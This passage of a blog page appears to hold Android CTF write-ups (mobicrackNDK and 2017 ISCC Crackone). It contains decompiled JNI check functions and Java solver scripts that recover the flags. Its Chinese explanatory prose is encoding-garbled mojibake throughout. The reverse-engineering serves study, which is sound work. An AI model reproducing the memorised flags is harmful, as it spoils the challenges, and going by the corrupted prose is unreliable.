class="keyword">this</span>.input)) &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, CrackMe.<span class="keyword">this</span>.input, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.<span class="built_in">makeText</span>(CrackMe.<span class="keyword">this</span>, <span class="string">&quot;Wrong flag&quot;</span>, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼ŒtestFlagå°±æ˜¯æ ¸å¿ƒçš„å‡½æ•°ï¼ŒåŠ è½½çš„mobicrackNDK</p><p>ä½†æ˜¯soæ–‡ä»¶dumpä¸‹æ¥ç›´æ¥æœç´¢ç¬¦å·æ˜¯æ²¡æœ‰çš„ï¼Œå› æ­¤è€ƒè™‘å¯»æ‰¾<code>JNI_Onload</code>å‡½æ•°ï¼ˆé€šè¿‡ <code>JNI_OnLoad</code> åŠ¨æ€æ³¨å†Œï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+4h] [bp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+Ch] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*vm)-&gt;<span class="built_in">GetEnv</span>(vm, (<span class="type">void</span> **)&amp;v8, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v3 = v8;</span><br><span class="line">  v4 = classPathName[<span class="number">0</span>];</span><br><span class="line">  stream = (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>((FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>), <span class="string">&quot;RegisterNatives start for &#x27;%s&#x27;&quot;</span>, classPathName[<span class="number">0</span>]);</span><br><span class="line">  v5 = (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">char</span> *))(*(_DWORD *)v3 + <span class="number">24</span>))(v3, v4);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;Native registration unable to find class &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;GetEnv failed&quot;</span>, (FILE *)((<span class="type">char</span> *)&amp;_sF + <span class="number">168</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">&quot;RegisterNatives failed for &#x27;%s&#x27;&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">char</span> **, <span class="type">int</span>))(*(_DWORD *)v3 + <span class="number">860</span>))(v3, v5, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ³¨å†Œçš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000400</span>C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+<span class="number">60</span>â†‘o</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; JNI_OnLoad+<span class="number">68</span>â†‘o ...</span><br><span class="line">.data:<span class="number">0000400</span>C                                         ; <span class="string">&quot;testFlag&quot;</span></span><br><span class="line">.data:<span class="number">00004010</span>                 DCD aLjavaLangStrin_0   ; <span class="string">&quot;(Ljava/lang/String;)Z&quot;</span></span><br><span class="line">.data:<span class="number">00004014</span>                 DCD abcdefghijklmn+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004018</span>                 DCD aHello              ; <span class="string">&quot;hello&quot;</span></span><br><span class="line">.data:<span class="number">0000401</span>C                 DCD aLjavaLangStrin_1   ; <span class="string">&quot;()Ljava/lang/String;&quot;</span></span><br><span class="line">.data:<span class="number">00004020</span>                 DCD native_hello+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004020</span> ; .data         ends</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°testFlagå°±æ˜¯abcdefghijklmnå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ‹¬å¼§é‡Œçš„æ˜¯å‚æ•°ï¼Œæ‹¬å¼§å¤–çš„æ˜¯è¿”å›å€¼çš„ç±»å‹ï¼Œå¯ä»¥çœ‹åˆ°testFlagå‡½æ•°çš„å‚æ•°ç±»å‹æ˜¯Stringï¼Œå‚æ•°è¿”å›ç±»å‹æ˜¯boolå‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br></pre></td></tr></table></figure><ul><li><code>a1</code>ï¼š<code>JNIEnv*</code> æŒ‡é’ˆï¼ˆé€šè¿‡ <code>jniEnv</code> å…¨å±€å˜é‡ç¼“å­˜ï¼‰</li><li><code>a2</code>ï¼šæœªä½¿ç”¨</li><li><code>a3</code>ï¼šè¾“å…¥çš„ Java å­—ç¬¦ä¸²å¯¹è±¡ï¼ˆ<code>jstring</code>ï¼‰</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r6</span></span><br><span class="line">  jmethodID v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_jfieldID</span> *key; <span class="comment">// r4</span></span><br><span class="line">  jobject v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// r5</span></span><br><span class="line">  jclass v12; <span class="comment">// [sp+4h] [bp-C4h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user_input; <span class="comment">// [sp+8h] [bp-C0h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [sp+14h] [bp-B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">140</span>]; <span class="comment">// [sp+20h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !jniEnv )</span><br><span class="line">    jniEnv = a1;                                <span class="comment">// ç¼“å­˜JNIEnvæŒ‡é’ˆ</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15[<span class="number">12</span>], <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  user_input = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, a3, <span class="number">0</span>);<span class="comment">// å°†javaå­—ç¬¦ä¸²è½¬ä¸ºcå­—ç¬¦ä¸²</span></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(user_input) == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">8</span>; ++i )</span><br><span class="line">      s2[i] = user_input[i] - i;                <span class="comment">// å‰8ä¸ªå­—ç¬¦å‡å»ç´¢å¼•å€¼</span></span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    s2[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(seed[<span class="number">0</span>], s2) )                 <span class="comment">// ä¸seed[0]æ¯”è¾ƒ</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = (*jniEnv)-&gt;<span class="built_in">FindClass</span>(jniEnv, <span class="string">&quot;com/example/mobicrackndk/Calc&quot;</span>);<span class="comment">// åŠ è½½è¿™ä¸ªç±»</span></span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;class,failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (*jniEnv)-&gt;<span class="built_in">GetStaticMethodID</span>(jniEnv, v12, <span class="string">&quot;calcKey&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;method,failed&quot;</span>);</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      _JNIEnv::<span class="built_in">CallStaticVoidMethod</span>(jniEnv, v12, v7);<span class="comment">// è°ƒç”¨ Java å±‚çš„ Calc.calcKey() æ–¹æ³•</span></span><br><span class="line">      key = (*a1)-&gt;<span class="built_in">GetStaticFieldID</span>(a1, v12, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);<span class="comment">// è·å–è¯¥é™æ€å­—æ®µçš„jfieldID</span></span><br><span class="line">      <span class="keyword">if</span> ( !key )</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;fid,failed&quot;</span>);</span><br><span class="line">      v9 = (*a1)-&gt;<span class="built_in">GetStaticObjectField</span>(a1, v12, key);<span class="comment">// è·å–ç›®æ ‡ç±»çš„é™æ€å­—æ®µå€¼</span></span><br><span class="line">      v10 = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, v9, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(v10) + <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        s2[i + <span class="number">4</span>] = user_input[i] - i;          <span class="comment">// s2[i+4]å…¶å®å°±æ˜¯v15[i]</span></span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      v15[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">strcmp</span>(v10, v15) == <span class="number">0</span>; <span class="comment">//ä¸keyè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘å¾—åˆ°ï¼Œæˆ‘ä»¬çš„è¾“å…¥çš„å‰å…«ä¸ªå­—èŠ‚å‡å»ç´¢å¼•è¦ä¸seed[0]ç›¸ç­‰ï¼Œåå…«ä¸ªå­—èŠ‚å‡å»ç´¢å¼•è¦ä¸keyç›¸åŒ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobicrackndk;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">calcKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> <span class="built_in">StringBuffer</span>(<span class="string">&quot;c7^WVHZ,&quot;</span>);</span><br><span class="line">        key = sb.<span class="built_in">reverse</span>().<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>key=&quot;,ZHVW^7c&quot;</code></p><p>æ‰€ä»¥å†™ä¸ªè„šæœ¬å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// æ¯ä¸ªå­—ç¬¦å‡å»ç´¢å¼•å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯wpè¯´è¿™æ˜¯é”™è¯¯çš„</p><p>å‘ç°æ˜¯åœ¨<code>_init_my</code>ä¸­å­˜åœ¨å¯¹seedçš„ä¿®æ”¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> _init_my()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    t[i] = seed[<span class="number">0</span>][i] - <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  seed[<span class="number">0</span>] = t;</span><br><span class="line">  byte_4038 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ½å‡äº†3ï¼Œå¯¹è„šæœ¬è¿›è¡Œä¿®æ”¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">8</span>)&#123;</span><br><span class="line">                chars[i]-=<span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// æ¯ä¸ªå­—ç¬¦å‡å»ç´¢å¼•å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NdkMobiL4cRackEr</span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><h1 id="é™æ€åˆ†æç»¼åˆé¢˜ç›®"><a href="#é™æ€åˆ†æç»¼åˆé¢˜ç›®" class="headerlink" title="é™æ€åˆ†æç»¼åˆé¢˜ç›®"></a>é™æ€åˆ†æç»¼åˆé¢˜ç›®</h1><h2 id="2017-ISCC-Crackone"><a href="#2017-ISCC-Crackone" class="headerlink" title="2017 ISCC Crackone"></a>2017 ISCC Crackone</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">     super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">     <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">     <span class="keyword">this</span>.editFlag = (EditText) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">     <span class="keyword">this</span>.button = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">     <span class="keyword">this</span>.button.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: org.isclab.iscc.MainActivity.1</span></span><br><span class="line">         @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">         <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">             String flag = Digest.<span class="built_in">encode</span>(MainActivity.<span class="keyword">this</span>.editFlag.<span class="built_in">getText</span>().<span class="built_in">toString</span>()).<span class="built_in">trim</span>();</span><br><span class="line">             Log.<span class="built_in">i</span>(<span class="string">&quot;ISCC&quot;</span>, flag);</span><br><span class="line">             <span class="type">int</span> result = MainActivity.<span class="keyword">this</span>.<span class="built_in">checkFlag</span>(flag.<span class="built_in">getBytes</span>(), flag.<span class="built_in">length</span>());</span><br><span class="line">             <span class="keyword">if</span> (result == <span class="number">1</span>) &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;FlagéªŒè¯æˆåŠŸï¼&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;FlagéªŒè¯å¤±è´¥ï¼&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>checkFlagä¸ºæ ¸å¿ƒå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">native_checkFlag</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *usrinput, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *usrinput_arr; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *end; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> tmp; <span class="comment">// [esp+2Bh] [ebp-21h]</span></span><br><span class="line">  jbyte *src; <span class="comment">// [esp+2Ch] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  src = (jbyte *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  (*a1)-&gt;<span class="built_in">GetByteArrayRegion</span>(a1, usrinput, <span class="number">0</span>, size, src);</span><br><span class="line">  usrinput_arr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(usrinput_arr, <span class="number">0</span>, size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(usrinput_arr, src, size);</span><br><span class="line">  <span class="keyword">if</span> ( size / <span class="number">2</span> &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    end = &amp;usrinput_arr[size];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      tmp = usrinput_arr[idx] - <span class="number">5</span>;</span><br><span class="line">      usrinput_arr[idx++] = *(end - <span class="number">1</span>);</span><br><span class="line">      *--end = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( idx != size / <span class="number">2</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  usrinput_arr[size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>(usrinput_arr);</span><br><span class="line">  <span class="built_in">free</span>(src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(usrinput_arr, <span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘å¾—åˆ°è„šæœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>);</span><br><span class="line">        String re_key=key.reverse().toString();</span><br><span class="line">        <span class="type">char</span>[] chars = re_key.toCharArray();</span><br><span class="line">        <span class="type">int</span> idx=re_key.length();</span><br><span class="line">        StringBuffer result=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;idx;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;idx/<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result.append((<span class="type">char</span>)(chars[i]+<span class="number">5</span>));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.append(chars[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 